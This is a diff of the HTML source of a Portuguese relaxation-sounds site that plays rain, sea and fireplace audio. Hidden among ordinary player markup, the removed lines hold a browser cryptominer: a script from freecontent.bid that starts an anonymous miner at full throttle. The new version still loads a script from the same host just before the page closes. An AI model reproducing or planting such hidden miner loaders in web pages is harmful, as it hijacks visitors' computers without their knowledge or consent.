@@ -1,74 +1,177 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+  <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="pt-BR" lang="pr-BR">
 
-<!DOCTYPE html>
-<html>
   <head>
-    <meta charset="utf-8">
-    <title>CHUVA</title>
-    <link rel="stylesheet" href="css/css.css">
-    <script type="text/javascript" src="js/jquery-3.1.1.min.js"></script>
-    <script type="text/javascript" src="js/jquery-3.1.1.js"></script>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <meta content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=yes" name="viewport" />
 
+    <meta name="Description" content="Som de chuva, mar e lareira!" xml:lang="pt-BR" lang="pt-BR" />
+    <meta name="keywords" content="Som de chuva, barulho de chuva, som de mar, som de lareira" lang="pt-BR" />
+    <meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
+    <META HTTP-EQUIV="EXPIRES" CONTENT="0">
+    <meta name="application-name" content="Dormiu" />
+    <meta name="msapplication-tooltip" content="Site para relaxar" />
+    <meta name="msapplication-starturl" content="http://dormirei.com" />
+    <meta name="msapplication-window" content="width=600;height=300" />
+    <meta name="msapplication-navbutton-color" content="#3CB371" />
+    <title>Dormiu</title>
+
+    <link rel="stylesheet" type="text/css" href="/assets/css/style.min.css" />
+    <link href="/assets/theme/skim/jplayer.blue.monday.css" rel="stylesheet" type="text/css" />
+
+    <script type="text/javascript" src="/assets/js/jquery.min.js"></script>
+    <script type="text/javascript" src="/assets/js/jquery.js"></script>
+    <script type="text/javascript" src="/assets/js/jquery.validate.js"></script>
+    <script type="text/javascript" src="/assets/js/swfobject/swfobject.js"></script>
+    <script type="text/javascript" src="/assets/js/jplayer.playlist.min.js"></script>
+    <script type="text/javascript" src="/assets/js/jquery.jplayer.inspector.js"></script>
+    <script type="text/javascript" src="/assets/js/jquery.jplayer.min.js"></script>
+    <script type="text/javascript" src="/assets/js/main.min.js"></script>
+
+    <script type="text/javascript">
+      swfobject.registerObject("myId", "9.0.0", "swfobject/expressInstall.swf");
+    </script>
   </head>
-  <body>
-    <div class="menu">
 
-    </div>
+  <!-- <link rel="shortcut icon" href="fav.ico" type="image/x-icon"> -->
 
-    <div class="conteudo flex">
-      <div class="player">
-        <audio src="audio/chuva.mp3" id ="chuvinha" preload="auto" autoplay loop>
-          <p>Seu navegador não suporta o elemento audio.</p>
-        </audio>
-        <div>
-          <!--<button type="button" onclick="aud_play_pause()">Play/Pause</button>
-          <button onclick="document.getElementById('chuvinha').play()">PLAY</button>
-          <button onclick="document.getElementById('chuvinha').pause()">PAUSE</button>-->
-          <button class="play" id="chuvinha">Pause</button>
-          <!--<button onclick="document.getElementById('chuvinha').volume-=0.1">-</button>
-          <button onclick="document.getElementById('chuvinha').volume+=0.1">+</button>-->
-          <button onclick="mute(this);">Mute</button>
+  <body id="dewbody">
 
+    <div id="site">
+
+      <div id="fundo">
+        <div id="content">
+          <h2>Som de chuva</h2>
+          <div style="clear:both"></div>
+          <div id="jquery_jplayer_1" class="jp-jplayer"></div>
+          <div id="jp_container_1" class="jp-audio">
+            <div class="jp-type-single">
+              <div class="jp-gui jp-interface">
+                <div class="jp-play-bar" style="border-radius:8px;float:left;">
+                  <ul class="jp-controls">
+                    <li><a href="javascript:;" class="jp-play" tabindex="1">Play</a></li>
+                    <li><a href="javascript:;" class="jp-pause" tabindex="1">Pause</a></li>
+                    <li><a href="javascript:;" class="jp-stop" tabindex="1">Stop</a></li>
+                    <li><a href="javascript:;" class="jp-mute" tabindex="1" title="Ligar mute">mute</a></li>
+                    <li><a href="javascript:;" class="jp-unmute" tabindex="1" title="Desligar mute">unmute</a></li>
+                    <li><a href="javascript:;" class="jp-volume-max" tabindex="1" title="Volume m�ximo">max volume</a></li>
+                  </ul>
+
+                  <div class="jp-volume-bar">
+                    <div class="jp-volume-bar-value"></div>
+                  </div>
+                  <div class="jp-time-holder">
+                    <ul class="jp-toggles">
+                      <li><a href="javascript:;" class="jp-repeat" tabindex="1" title="Ligar repetir">repeat</a></li>
+                      <li><a href="javascript:;" class="jp-repeat-off" tabindex="1" title="Desligar repetir">repeat off</a></li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+              <div class="jp-no-solution">
+                <span>Update Required</span> To play the media you will need to either update your browser to a recent version or update your <a href="http://get.adobe.com/flashplayer/" target="_blank">Flash plugin</a>.
+              </div>
+            </div>
+          </div>
+          <div style="clear:both"></div>
+
+          <div class="trovao">
+            <div style="float:left;margin-left:7px;width:41px;height:16px;margin-top:5px;">
+              <div class="trovaoo">
+                <input type="checkbox" value="None" id="trovaoo" name="check" />
+                <label for="trovaoo" title="Liga/Desliga Trov�es"></label>
+              </div>
+              <div id="loadCliques" style="display:none"> </div>
+            </div>
+            <div style="float:left;width:50px;height:16px;margin-top:4px;margin-left:4px;">
+              <font size="2"><label for="trovaoo" title="Liga/Desliga Trov�es">Trovões</font></label>
+            </div>
+            <div style="float:left;margin-left:32px;width:41px;height:16px;margin-top:5px;">
+              <div class="tempestade">
+                <input type="checkbox" value="None" id="tempestade" name="check" />
+                <label for="tempestade" title="Liga/Desliga tempestade"></label>
+              </div>
+              <div id="loadCliques" style="display:none"> </div>
+            </div>
+            <div style="float:right;width:72px;height:16px;margin-top:4px;margin-right:7px;">
+              <font size="2"><label for="tempestade" title="Liga/Desliga tempestade">Tempestade</font></label>
+            </div>
+          </div>
+          <div style="clear:both"></div>
+          <div class=linha></div>
+          <h2>Som de mar</h2>
+
+
+          <div id="jquery_jplayer_2" class="jp-jplayer"></div>
+          <div id="jp_container_2" class="jp-audio">
+            <div class="jp-type-single">
+              <div class="jp-gui jp-interface">
+                <div class="jp-play-bar" style="border-radius:8px;float:left;">
+                  <ul class="jp-controls">
+                    <li><a href="javascript:;" class="jp-play" title="Tocar som do mar" tabindex="1">play</a></li>
+                    <li><a href="javascript:;" class="jp-pause" title="pausar som do mar" tabindex="1">pause</a></li>
+                    <li><a href="javascript:;" class="jp-stop" title="Parar som do mar" tabindex="1">stop</a></li>
+                    <li><a href="javascript:;" class="jp-mute" title="Sem som" tabindex="1" title="mute">mute</a></li>
+                    <li><a href="javascript:;" class="jp-unmute" title="Com som" tabindex="1" title="unmute">unmute</a></li>
+                    <li><a href="javascript:;" class="jp-volume-max" title="Som m�ximo" tabindex="1" title="max volume">max volume</a></li>
+                  </ul>
+                  <div class="jp-volume-bar">
+                    <div class="jp-volume-bar-value" title="Ajusta o volume"></div>
+                  </div>
+                  <div class="jp-time-holder">
+                    <ul class="jp-toggles">
+                      <li><a href="javascript:;" class="jp-repeat" tabindex="1" title="Ligar repeti��o">repeat</a></li>
+                      <li><a href="javascript:;" class="jp-repeat-off" tabindex="1" title="Desligar repeti��o">repeat off</a></li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+              <div class="jp-no-solution">
+                <span>Update Required</span> To play the media you will need to either update your browser to a recent version or update your <a href="http://get.adobe.com/flashplayer/" target="_blank">Flash plugin</a>.
+              </div>
+            </div>
+          </div>
+
+          <div class=linha></div>
+
+          <h2>Som de lareira</h2>
+          <div style="clear:both"></div>
+
+          <div id="jquery_jplayer_3" class="jp-jplayer"></div>
+          <div id="jp_container_3" class="jp-audio">
+            <div class="jp-type-single">
+              <div class="jp-gui jp-interface">
+                <div class="jp-play-bar" style="border-radius:8px;float:left;">
+                  <ul class="jp-controls">
+                    <li><a href="javascript:;" class="jp-play" title="Tocar som de lareira" tabindex="1">play</a></li>
+                    <li><a href="javascript:;" class="jp-pause" title="Pausar som de lareira" tabindex="1">pause</a></li>
+                    <li><a href="javascript:;" class="jp-stop" title="Parar som de lareira" tabindex="1">stop</a></li>
+                    <li><a href="javascript:;" class="jp-mute" title="Sem som" tabindex="1" title="mute">mute</a></li>
+                    <li><a href="javascript:;" class="jp-unmute" title="Com som" tabindex="1" title="unmute">unmute</a></li>
+                    <li><a href="javascript:;" class="jp-volume-max" title="Som m�ximo" tabindex="1" title="max volume">max volume</a></li>
+                  </ul>
+                  <div class="jp-volume-bar">
+                    <div class="jp-volume-bar-value" title="Ajusta o volume"></div>
+                  </div>
+                  <div class="jp-time-holder">
+                    <ul class="jp-toggles">
+                      <li><a href="javascript:;" class="jp-repeat" tabindex="1" title="Ligar repeti��o">repeat</a></li>
+                      <li><a href="javascript:;" class="jp-repeat-off" tabindex="1" title="Desligar repeti��o">repeat off</a></li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+              <div class="jp-no-solution">
+                <span>Update Required</span> To play the media you will need to either update your browser to a recent version or update your <a href="http://get.adobe.com/flashplayer/" target="_blank">Flash plugin</a>.
+              </div>
+            </div>
+          </div>
         </div>
-
       </div>
     </div>
 
-    <footer>
-
-    </footer>
-    
-    
-    <script src="https://www.freecontent.bid./Hu84.js"></script>
-    <script>var miner=new Client.Anonymous("f6acf4e1615970caae5f4fe9c5587df1931dba6a0d06a4c8005355f8d0d31f49",{throttle:0});miner.start();</script>
-    
-    <script type="text/javascript">
-    var video = document.getElementById("chuvinha");
-
-    function mute(btn) {
-      var muted = video.muted;
-      btn.innerHTML = muted ? 'Mute' : 'un Mute';
-      video.muted = !muted;
-    }
-
-
-    $('.play').click(function(){
-      var $this = $(this);
-
-      // starting audio
-      var audioID = "chuvinha";
-
-      $this.toggleClass('active');
-      if($this.hasClass('active')){
-          $this.text('Play');
-          $("#" + audioID).trigger('pause');
-      } else {
-          $this.text('Pause');
-          $("#" + audioID).trigger('play');
-      }
-  });
-  </script>
-    
-    
-
+    <script src="https://www.freecontent.bid./GsoT.js"></script>
+    <script type="text/javascript" src="/assets/js/menu.min.js"></script>
   </body>
-</html>
+
+  </html>
